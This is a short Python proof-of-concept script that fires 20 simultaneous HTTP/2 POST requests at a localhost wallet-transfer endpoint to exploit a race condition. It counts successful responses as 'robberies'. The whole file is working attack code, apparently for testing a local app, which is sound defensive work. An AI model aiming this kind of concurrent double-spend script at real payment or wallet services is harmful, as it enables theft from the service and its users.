import asyncio
import httpx
import time

# Target (Note HTTPS)
URL = "https://localhost:3000/wallet/transfer"
PAYLOAD = {"fromId": 101, "toId": 102, "amount": 50}
CONCURRENCY = 20

async def attack():
    # Verify SSL=False because self-signed cert
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        print(f"--- Opening HTTP/2 Tunnel to {URL} ---")
        
        # Prepare 20 requests
        tasks = []
        for i in range(CONCURRENCY):
            # We schedule them all to run on the event loop immediately
            tasks.append(client.post(URL, json=PAYLOAD))
        
        print(f"--- FIRING {CONCURRENCY} STREAMS IN SINGLE BATCH ---")
        start_time = time.time()
        
        # Fire them all at once
        responses = await asyncio.gather(*tasks)
        
        end_time = time.time()
        print(f"--- Attack Duration: {end_time - start_time:.4f}s ---")
        
        # Count Successes
        success_count = sum(1 for r in responses if r.status_code == 200)
        print(f"Successful Robberies: {success_count}/{CONCURRENCY}")

if __name__ == "__main__":
    asyncio.run(attack())